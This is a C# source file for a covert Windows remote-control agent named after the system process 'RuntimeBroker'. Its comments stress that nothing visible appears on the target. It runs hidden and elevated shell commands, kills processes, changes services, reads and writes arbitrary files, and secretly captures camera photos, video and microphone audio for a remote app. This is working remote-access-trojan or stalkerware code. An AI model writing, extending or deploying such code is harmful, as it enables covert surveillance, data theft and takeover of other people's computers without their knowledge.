using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Text.Json;

namespace RuntimeBroker;

/// <summary>
/// All remote-control command implementations. Every method is hidden
/// (CreateNoWindow): nothing visible ever appears on the target.
/// </summary>
internal static class RemoteCommands
{
    /// <summary>Persistent working directory for the shell emulation; one-shot
    /// cmd.exe process otherwise loses every `cd`, which trapped users in the
    /// agent's own startup folder.</summary>
    private static readonly object CwdLock = new object();
    private static string _cwd = Environment.CurrentDirectory;

    public static string Cwd
    {
        get { lock (CwdLock) return _cwd; }
        set { lock (CwdLock) _cwd = value; }
    }

    // ── shell ────────────────────────────────────────────────────────────
    public static (bool Ok, string Output, int ExitCode, string? Error) ShellExec(string command, int timeoutSec, bool admin = false)
    {
        if (admin) return ShellExecElevated(command, timeoutSec);
        return ShellExecPlain(command, timeoutSec);
    }

    private static (bool Ok, string Output, int ExitCode, string? Error) ShellExecPlain(string command, int timeoutSec)
    {
        try
        {
            // `cd` alone prints the cwd; `cd X & cd` prints output then cwd — both keep the
            // app's prompt in sync. Any other command starts in the persisted directory.
            if (command.TrimStart().StartsWith("cd", StringComparison.OrdinalIgnoreCase)
                && !command.Contains("& cd", StringComparison.OrdinalIgnoreCase)
                && !command.Contains("&cd", StringComparison.OrdinalIgnoreCase)
                && !command.Contains("|", StringComparison.Ordinal)
                && !command.Contains("&&", StringComparison.Ordinal))
            {
                command += " & cd";
            }
            var inner = $"cd /d \"{Cwd}\" & {command}";
            var psi = new ProcessStartInfo("cmd.exe", "/c " + inner)
            {
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            };
            using var p = Process.Start(psi);
            if (p == null) return (false, "", 1, "Failed to start shell");
            var outSb = new StringBuilder();
            var errSb = new StringBuilder();
            p.OutputDataReceived += (_, e) => { if (e.Data != null) outSb.AppendLine(e.Data); };
            p.ErrorDataReceived += (_, e) => { if (e.Data != null) errSb.AppendLine(e.Data); };
            p.BeginOutputReadLine();
            p.BeginErrorReadLine();
            if (!p.WaitForExit(Math.Clamp(timeoutSec, 1, 600) * 1000))
            {
                try { p.Kill(true); } catch { }
                return (false, outSb.ToString(), 124, "Command timed out");
            }
            var combined = outSb.ToString();
            if (errSb.Length > 0) combined += "\n[stderr]\n" + errSb;
            UpdateCwdFromOutput(command, combined);
            return (true, combined, p.ExitCode, null);
        }
        catch (Exception ex)
        {
            return (false, "", 1, ex.Message);
        }
    }

    /// <summary>When a `cd` command changed the directory, the trailing `& cd`
    /// echoed the new one as the last output line — remember it so the next
    /// command starts there (persistent-session behavior).</summary>
    private static void UpdateCwdFromOutput(string command, string output)
    {
        if (!command.TrimStart().StartsWith("cd", StringComparison.OrdinalIgnoreCase)) return;
        var lines = output.Split('\n')
            .Select(l => l.TrimEnd('\r').Trim())
            .Where(l => l.Length > 0)
            .ToList();
        if (lines.Count == 0) return;
        var last = lines[lines.Count - 1];
        if (last.Length >= 3 && char.IsLetter(last[0]) && last[1] == ':' && (last[2] == '\\' || last[2] == '/')
            && Directory.Exists(last))
        {
            Cwd = last;
        }
    }

    /// <summary>True when this process already runs elevated (installed
    /// service runs as LocalSystem — always admin, no UAC prompt needed).</summary>
    private static bool IsElevated =>
        new System.Security.Principal.WindowsPrincipal(
            System.Security.Principal.WindowsIdentity.GetCurrent())
            .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

    /// <summary>
    /// Runs a command through an elevated cmd.exe. When the agent is already
    /// elevated (Windows service as LocalSystem), cmd runs directly — no UAC
    /// prompt. Otherwise Verb = runas pops UAC consent on the agent machine;
    /// stdout/stderr go through temp files so the shell (which cannot hold
    /// pipe handles across a UAC boundary) can capture the command output.
    /// </summary>
    public static (bool Ok, string Output, int ExitCode, string? Error) ShellExecElevated(string command, int timeoutSec)
    {
        var timeoutMs = Math.Clamp(timeoutSec, 1, 600) * 1000;
        var id = Guid.NewGuid().ToString("N");
        var temp = Environment.GetEnvironmentVariable("TEMP") ?? ".";
        var outF = Path.Combine(temp, "mimo_elev_out_" + id + ".txt");
        var errF = Path.Combine(temp, "mimo_elev_err_" + id + ".txt");
        var codeF = Path.Combine(temp, "mimo_elev_code_" + id + ".txt");
        try
        {
            // cd into the persisted dir, force UTF-8 output, capture, then
            // `cd` so a `cd`-type command still reports the new directory
            // (its own echo is part of the redirected output).
            var inner = $"cd /d \"{Cwd}\" & chcp 65001>nul & ( {command} & cd ) > \"{outF}\" 2> \"{errF}\" & echo %errorlevel% > \"{codeF}\"";
            var psi = new ProcessStartInfo("cmd.exe", "/c " + inner)
            {
                UseShellExecute = !IsElevated,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            if (!IsElevated) psi.Verb = "runas";
            using (var p = Process.Start(psi))
            {
                if (p == null) return (false, "", 1, "Failed to start elevated shell");
                // The elevated cmd detaches from us? No — Start with runas still
                // returns the process; wait for the code marker file.
            }
            // Wait for the code file (written last by the cmd script).
            var sw = System.Diagnostics.Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < timeoutMs)
            {
                if (File.Exists(codeF))
                {
                    try { var t = File.ReadAllText(codeF).Trim(); if (t.Length > 0) break; } catch { }
                }
                Thread.Sleep(250);
            }
            if (!File.Exists(codeF)) return (false, "", 1, "Elevated command timed out (no result marker). UAC prompt may still be pending on the agent machine.");
            string output = "", errText = "", codeStr = "";
            try { codeStr = File.ReadAllText(codeF).Trim(); } catch { }
            try { output = File.ReadAllText(outF, Encoding.UTF8); } catch { }
            try { errText = File.ReadAllText(errF, Encoding.UTF8); } catch { }
            int.TryParse(codeStr, out var rc);
            var combined = output;
            if (errText.Length > 0) combined += "\n[stderr]\n" + errText;
            UpdateCwdFromOutput(command, output);
            return (true, combined, rc, null);
        }
        catch (System.ComponentModel.Win32Exception we)
        {
            return (false, "", 1, we.Message + (we.NativeErrorCode == 1223 ? " (UAC was declined on the agent machine)" : ""));
        }
        catch (Exception ex)
        {
            return (false, "", 1, ex.Message);
        }
        finally
        {
            foreach (var f in new[] { outF, errF, codeF })
            {
                try { if (File.Exists(f)) File.Delete(f); } catch { }
            }
        }
    }

    // ── processes ────────────────────────────────────────────────────────
    // Keys match the Android app exactly: pid, name, title, memMB, cpu,
    // connections, session, hasWindow.
    public static object ListProcesses()
    {
        // Quick CPU sample: two TotalProcessorTime reads ~300ms apart.
        var procs = Process.GetProcesses();
        var first = new Dictionary<int, (TimeSpan Total, DateTime At)>();
        foreach (var p in procs)
        {
            try { first[p.Id] = (p.TotalProcessorTime, DateTime.UtcNow); } catch { }
        }
        Thread.Sleep(300);
        var conns = TcpConnectionCounts();
        var list = new List<object>();
        int cpus = Math.Max(1, Environment.ProcessorCount);
        foreach (var p in procs)
        {
            try
            {
                double cpu = 0;
                if (first.TryGetValue(p.Id, out var f))
                {
                    var total2 = p.TotalProcessorTime;
                    var ms = (DateTime.UtcNow - f.At).TotalMilliseconds;
                    if (ms > 0) cpu = Math.Round((total2 - f.Total).TotalMilliseconds / ms * 100 / cpus, 1);
                }
                conns.TryGetValue(p.Id, out int nConn);
                list.Add(new
                {
                    pid = p.Id,
                    name = p.ProcessName,
                    title = Safe(() => p.MainWindowTitle ?? ""),
                    memMB = p.WorkingSet64 / 1048576L,
                    cpu = Math.Max(0, cpu),
                    connections = nConn,
                    session = p.SessionId,
                    hasWindow = p.MainWindowHandle != IntPtr.Zero
                });
            }
            catch { }
            finally { try { p.Dispose(); } catch { } }
        }
        return list;
    }

    /// <summary>PID → active TCP connection count via the IP helper table.</summary>
    private static Dictionary<int, int> TcpConnectionCounts()
    {
        var map = new Dictionary<int, int>();
        IntPtr table = IntPtr.Zero;
        try
        {
            int size = 0;
            GetExtendedTcpTable(IntPtr.Zero, ref size, false, 2, 5, 0);
            if (size <= 0 || size > 1 << 24) return map;
            table = Marshal.AllocHGlobal(size);
            if (GetExtendedTcpTable(table, ref size, false, 2, 5, 0) != 0)
                return map;
            int count = Marshal.ReadInt32(table);
            IntPtr row = IntPtr.Add(table, 4);
            int rowSize = Marshal.SizeOf<MIB_TCPROW_OWNER_PID>();
            for (int i = 0; i < count; i++)
            {
                try
                {
                    var r = Marshal.PtrToStructure<MIB_TCPROW_OWNER_PID>(IntPtr.Add(row, i * rowSize));
                    map.TryGetValue((int)r.owningPid, out int n);
                    map[(int)r.owningPid] = n + 1;
                }
                catch { }
            }
        }
        catch { }
        finally { if (table != IntPtr.Zero) Marshal.FreeHGlobal(table); }
        return map;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct MIB_TCPROW_OWNER_PID
    {
        public uint state;
        public uint localAddr;
        public uint localPort;
        public uint remoteAddr;
        public uint remotePort;
        public uint owningPid;
    }

    [DllImport("iphlpapi.dll", SetLastError = true)]
    private static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, int tblClass, int reserved);

    public static (bool Ok, string? Error) KillProcess(int pid)
    {
        try
        {
            using var p = Process.GetProcessById(pid);
            p.Kill(true);
            p.WaitForExit(10000);
            return (true, null);
        }
        catch (Exception ex)
        {
            return (false, ex.Message);
        }
    }

    // ── services ─────────────────────────────────────────────────────────
    public static object ListServices()
    {
        var list = new List<object>();
        foreach (var s in ServiceController.GetServices())
        {
            try
            {
                list.Add(new
                {
                    name = s.ServiceName,
                    displayName = Safe(() => s.DisplayName ?? ""),
                    status = s.Status.ToString(),
                    startType = GetStartupType(s.ServiceName)
                });
            }
            catch { }
            finally { try { s.Dispose(); } catch { } }
        }
        return list;
    }

    public static (bool Ok, string? Error) ServiceAction(string name, string action)
    {
        try
        {
            var a = (action ?? "").ToLowerInvariant();
            if (a is "auto" or "automatic" or "manual" or "disabled" or "demand")
                return SetStartup(name, a);
            using var s = new ServiceController(name);
            switch (a)
            {
                case "start":
                    s.Start();
                    s.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(30));
                    break;
                case "stop":
                    s.Stop();
                    s.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(30));
                    break;
                case "restart": {
                    // The agent cannot stop-then-start ITS OWN service from
                    // within its service process: the SCM shutdown kills the
                    // process before Start() runs. Run stop+start detached so
                    // this works for the agent's own service too.
                    var psiR = new ProcessStartInfo("cmd.exe",
                        $"/c sc.exe stop \"{name}\" >nul 2>&1 &timeout /t 2 /nobreak >nul &sc.exe start \"{name}\" >nul 2>&1")
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(psiR)?.Dispose();
                    Thread.Sleep(500);
                    return (true, $"{action} {name} (detached)");
                }
                default:
                    return (false, $"Unknown service action: {action}");
            }
            return (true, null);
        }
        catch (Exception ex)
        {
            return (false, ex.Message);
        }
    }

    // Registry read (no process spawn): listing ~200 services must stay
    // well under the server's 35s command timeout.
    private static string GetStartupType(string name)
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                $"SYSTEM\\CurrentControlSet\\Services\\{name}", false);
            if (key == null) return "";
            var start = key.GetValue("Start");
            int v = start is int i ? i : -1;
            return v switch
            {
                2 => "auto",
                3 => "manual",
                4 => "disabled",
                _ => ""
            };
        }
        catch { return ""; }
    }

    private static (bool Ok, string? Error) SetStartup(string name, string mode)
    {
        var m = mode switch
        {
            "auto" or "automatic" => "auto",
            "manual" or "demand" => "demand",
            _ => "disabled"
        };
        try
        {
            var p = new ProcessStartInfo("sc.exe", $"config \"{name}\" start= {m}")
            {
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            using var proc = Process.Start(p);
            if (proc == null) return (false, "sc failed to start");
            proc.WaitForExit(15000);
            return proc.ExitCode == 0 ? (true, null) : (false, $"sc exit {proc.ExitCode}");
        }
        catch (Exception ex)
        {
            return (false, ex.Message);
        }
    }

    // ── files ────────────────────────────────────────────────────────────
    // Always returns a JSON array (the Android app casts data to JSONArray).
    // Throws on failure so the caller reports success=false + error text.
    public static List<object> ListFiles(string path, bool recursive = false)
    {
        var items = new List<object>();
        var root = string.IsNullOrWhiteSpace(path) ? "C:\\" : path;
        foreach (var d in Directory.GetDirectories(root))
        {
            try
            {
                var di = new DirectoryInfo(d);
                items.Add(new { name = di.Name, path = di.FullName, isDir = true, size = 0L, modified = di.LastWriteTimeUtc.ToString("o") });
            }
            catch { }
        }
        foreach (var f in Directory.GetFiles(root))
        {
            try
            {
                var fi = new FileInfo(f);
                items.Add(new { name = fi.Name, path = fi.FullName, isDir = false, size = fi.Length, modified = fi.LastWriteTimeUtc.ToString("o") });
            }
            catch { }
        }
        return items;
    }

    public static (bool Ok, string? Base64, string? Error) ReadFile(string path)
    {
        try
        {
            var bytes = File.ReadAllBytes(path);
            return (true, Convert.ToBase64String(bytes), null);
        }
        catch (Exception ex)
        {
            return (false, null, ex.Message);
        }
    }

    public static (bool Ok, string? Error) WriteFile(string path, string base64)
    {
        try
        {
            var bytes = Convert.FromBase64String(base64);
            var dir = Path.GetDirectoryName(path);
            if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
            File.WriteAllBytes(path, bytes);
            return (true, null);
        }
        catch (Exception ex)
        {
            return (false, ex.Message);
        }
    }

    public static (bool Ok, string? SavedPath, string? Error) TransferFile(string base64, string filename)
    {
        try
        {
            var bytes = Convert.FromBase64String(base64);
            var safe = string.Concat((filename ?? "file.bin").Split(Path.GetInvalidFileNameChars()));
            if (string.IsNullOrWhiteSpace(safe)) safe = "file.bin";
            var downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
            var dest = Path.Combine(downloads, safe);
            File.WriteAllBytes(dest, bytes);
            return (true, dest, null);
        }
        catch (Exception ex)
        {
            return (false, null, ex.Message);
        }
    }

    // ── screen rotate (must run in the user session) ─────────────────────
    public static (bool Ok, string? Error) ScreenRotate(int degrees)
    {
        if (degrees is not (0 or 90 or 180 or 270))
            return (false, "degrees must be 0, 90, 180 or 270");
        var (ok, err) = PowerShellRunner.RunInteractiveWait($"--rotate {degrees}", 30);
        return ok ? (true, null) : (false, err ?? "Rotate failed");
    }

    public static int DoRotate(int degrees)
    {
        try
        {
            var dm = new DEVMODE();
            dm.dmSize = (short)Marshal.SizeOf<DEVMODE>();
            if (EnumDisplaySettings(null, ENUM_CURRENT_SETTINGS, ref dm) == 0)
                return 1;
            if ((dm.dmFields & DM_DISPLAYORIENTATION) == 0)
                return 2;
            int current = dm.dmDisplayOrientation;
            int target = degrees switch { 90 => 1, 180 => 2, 270 => 3, _ => 0 };
            if (current == target) return 0;
            // Swap width/height when rotating between landscape and portrait.
            if ((current + target) % 2 == 1)
            {
                (dm.dmPelsWidth, dm.dmPelsHeight) = (dm.dmPelsHeight, dm.dmPelsWidth);
            }
            dm.dmDisplayOrientation = target;
            var res = ChangeDisplaySettingsEx(null, ref dm, IntPtr.Zero,
                CDS_UPDATEREGISTRY | CDS_NORESET, IntPtr.Zero);
            if (res != DISP_CHANGE_SUCCESSFUL) return 3;
            ChangeDisplaySettingsEx(null, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero);
            return 0;
        }
        catch
        {
            return 4;
        }
    }

    // ── audio playback (mci, hidden — mp3/wav) ───────────────────────────
    private static string? _audioAlias;

    // Audio must play in the user session (Session 0 has no sound), so the
    // bytes are staged in the shared scratch dir and a hidden task plays
    // them with --play (blocking MCI `play wait`, ended by stop_audio).
    private static string? _audioFile;

    public static (bool Ok, string? Error) PlayAudio(string base64, string filename)
    {
        try
        {
            StopAudio();
            var bytes = Convert.FromBase64String(base64);
            var ext = Path.GetExtension(filename ?? ".mp3");
            if (string.IsNullOrEmpty(ext)) ext = ".mp3";
            var tmp = Path.Combine(PowerShellRunner.CaptureWorkDir(), $"audio-{Guid.NewGuid():N}{ext}");
            File.WriteAllBytes(tmp, bytes);
            _audioFile = tmp;
            var (ok, err) = PowerShellRunner.PlayInteractiveAudio(tmp);
            if (!ok)
            {
                // Fallback: service-session MCI (silent on most machines,
                // but harmless where an output device exists).
                _audioAlias = $"rb{Guid.NewGuid():N}";
                if (MciSend($"open \"{tmp}\" alias {_audioAlias}") != 0)
                    return (false, err ?? "Audio open failed");
                if (MciSend($"play {_audioAlias}") != 0)
                    return (false, err ?? "Audio play failed");
                return (true, null);
            }
            return (true, null);
        }
        catch (Exception ex)
        {
            return (false, ex.Message);
        }
    }

    public static void StopAudio()
    {
        try { PowerShellRunner.StopInteractiveAudio(); } catch { }
        try
        {
            if (_audioFile != null)
            {
                try { File.Delete(_audioFile); } catch { }
                _audioFile = null;
            }
            if (_audioAlias != null)
            {
                MciSend($"stop {_audioAlias}");
                MciSend($"close {_audioAlias}");
                _audioAlias = null;
            }
        }
        catch { }
    }

    /// <summary>
    /// Blocking playback for the --play child (runs in the user session).
    /// Returns a process exit code.
    /// </summary>
    public static int PlayAudioFile(string path)
    {
        string? alias = null;
        try
        {
            if (!File.Exists(path)) return 1;
            alias = $"rbplay{Guid.NewGuid():N}";
            var err = new StringBuilder(256);
            if (mciSendString($"open \"{path}\" alias {alias}", err, err.Capacity, IntPtr.Zero) != 0)
                return 2;
            // Preferred: block until the track ends.
            if (mciSendString($"play {alias} wait", err, err.Capacity, IntPtr.Zero) != 0)
            {
                // Fallback: query length and sleep that long.
                if (mciSendString($"status {alias} length", err, err.Capacity, IntPtr.Zero) == 0 &&
                    int.TryParse(err.ToString().Trim(), out int ms) && ms > 0)
                    Thread.Sleep(Math.Min(ms, 600_000));
                else
                    Thread.Sleep(5000);
            }
            return 0;
        }
        catch
        {
            return 3;
        }
        finally
        {
            try
            {
                if (alias != null)
                {
                    mciSendString($"stop {alias}", IntPtr.Zero, 0, IntPtr.Zero);
                    mciSendString($"close {alias}", IntPtr.Zero, 0, IntPtr.Zero);
                }
            }
            catch { }
            try { File.Delete(path); } catch { }
        }
    }

    private static int MciSend(string cmd)
    {
        var sb = new StringBuilder(256);
        return mciSendString(cmd, sb, sb.Capacity, IntPtr.Zero);
    }

    // ── camera / mic (DirectShow + NAudio, hidden) ───────────────────────
    public static (bool Ok, string? Base64, string? Error) CameraPhoto()
    {
        try
        {
            var bytes = MediaCapture.CameraPhotoJpeg();
            if (bytes == null) return (false, null, "No camera available or capture failed");
            return (true, Convert.ToBase64String(bytes), null);
        }
        catch (Exception ex)
        {
            return (false, null, ex.Message);
        }
    }

    public static (bool Ok, string? Base64, string? Error) CameraVideo(int seconds)
    {
        try
        {
            seconds = Math.Clamp(seconds, 1, 120);
            var bytes = MediaCapture.CameraVideoAvi(seconds);
            if (bytes == null) return (false, null, "No camera available or record failed");
            return (true, Convert.ToBase64String(bytes), null);
        }
        catch (Exception ex)
        {
            return (false, null, ex.Message);
        }
    }

    public static (bool Ok, string? Base64, string? Error) MicRecord(int seconds)
    {
        try
        {
            seconds = Math.Clamp(seconds, 1, 300);
            var bytes = MediaCapture.MicRecordWav(seconds);
            if (bytes == null) return (false, null, "No microphone available or record failed");
            return (true, Convert.ToBase64String(bytes), null);
        }
        catch (Exception ex)
        {
            return (false, null, ex.Message);
        }
    }

    // ── helpers ──────────────────────────────────────────────────────────
    private static T Safe<T>(Func<T> f, T fallback = default!)
    {
        try { return f(); } catch { return fallback; }
    }

    private static string JsonEl(JsonElement el, string name)
        => el.TryGetProperty(name, out var p) ? p.ValueKind switch
        {
            JsonValueKind.String => p.GetString() ?? "",
            JsonValueKind.Number => p.GetRawText(),
            JsonValueKind.True => "true",
            JsonValueKind.False => "false",
            _ => ""
        } : "";

    public static string GetString(JsonElement el, string name) => JsonEl(el, name);

    public static int GetInt(JsonElement el, string name, int fallback = 0)
    {
        try
        {
            if (el.TryGetProperty(name, out var p))
            {
                if (p.ValueKind == JsonValueKind.Number && p.TryGetInt32(out var n)) return n;
                if (p.ValueKind == JsonValueKind.String && int.TryParse(p.GetString(), out var s)) return s;
            }
        }
        catch { }
        return fallback;
    }

    public static bool GetBool(JsonElement el, string name, bool fallback = false)
    {
        try
        {
            if (el.TryGetProperty(name, out var p))
            {
                if (p.ValueKind is JsonValueKind.True) return true;
                if (p.ValueKind is JsonValueKind.False) return false;
                if (p.ValueKind == JsonValueKind.String && bool.TryParse(p.GetString(), out var s)) return s;
            }
        }
        catch { }
        return fallback;
    }

    // display-settings natives
    private const int ENUM_CURRENT_SETTINGS = -1;
    private const int CDS_UPDATEREGISTRY = 0x01;
    private const int CDS_NORESET = 0x10000000;
    private const int DISP_CHANGE_SUCCESSFUL = 0;
    private const int DM_DISPLAYORIENTATION = 0x00000080;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    private struct DEVMODE
    {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName;
        public short dmSpecVersion;
        public short dmDriverVersion;
        public short dmSize;
        public short dmDriverExtra;
        public int dmFields;
        public int dmPositionX;
        public int dmPositionY;
        public int dmDisplayOrientation;
        public int dmDisplayFixedOutput;
        public short dmColor;
        public short dmDuplex;
        public short dmYResolution;
        public short dmTTOption;
        public short dmCollate;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmFormName;
        public short dmLogPixels;
        public int dmBitsPerPel;
        public int dmPelsWidth;
        public int dmPelsHeight;
        public int dmDisplayFlags;
        public int dmDisplayFrequency;
        public int dmICMMethod;
        public int dmICMIntent;
        public int dmMediaType;
        public int dmDitherType;
        public int dmReserved1;
        public int dmReserved2;
        public int dmPanningWidth;
        public int dmPanningHeight;
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi)]
    private static extern int EnumDisplaySettings(string? deviceName, int modeNum, ref DEVMODE devMode);

    [DllImport("user32.dll", CharSet = CharSet.Ansi)]
    private static extern int ChangeDisplaySettingsEx(string? deviceName, ref DEVMODE devMode, IntPtr hwnd, int flags, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern int ChangeDisplaySettingsEx(string? deviceName, IntPtr devMode, IntPtr hwnd, int flags, IntPtr lParam);

    [DllImport("winmm.dll", CharSet = CharSet.Auto)]
    private static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

    [DllImport("winmm.dll", CharSet = CharSet.Auto)]
    private static extern int mciSendString(string command, IntPtr buffer, int bufferSize, IntPtr hwndCallback);
}
